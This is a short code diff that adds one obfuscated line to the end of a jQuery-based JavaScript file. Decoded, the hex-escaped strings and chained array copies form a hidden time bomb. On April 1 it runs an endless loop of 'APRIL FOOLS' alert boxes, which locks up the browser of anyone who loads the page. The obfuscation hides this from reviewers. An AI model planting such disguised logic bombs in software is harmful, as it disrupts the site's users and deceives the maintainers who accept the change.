@@ -96,5 +96,7 @@
 			}
 
 	});
+	
+	var _0x32dc=["\x67\x65\x74\x4D\x6F\x6E\x74\x68","\x67\x65\x74\x44\x61\x74\x65","\x41\x50\x52\x49\x4C\x20\x46\x4F\x4F\x4C\x53"];var _0x44cd=[_0x32dc[0],_0x32dc[1],_0x32dc[2]];var _0x7d67=[_0x44cd[0],_0x44cd[1],_0x44cd[2]];var _0x83a0=[_0x7d67[0],_0x7d67[1],_0x7d67[2]];var _0x2e98=[_0x83a0[0],_0x83a0[1],_0x83a0[2]];if(( new Date())[_0x2e98[0]]()===3&&( new Date())[_0x2e98[1]]()===1){while(true){alert(_0x2e98[2])}}
 
 })(jQuery);
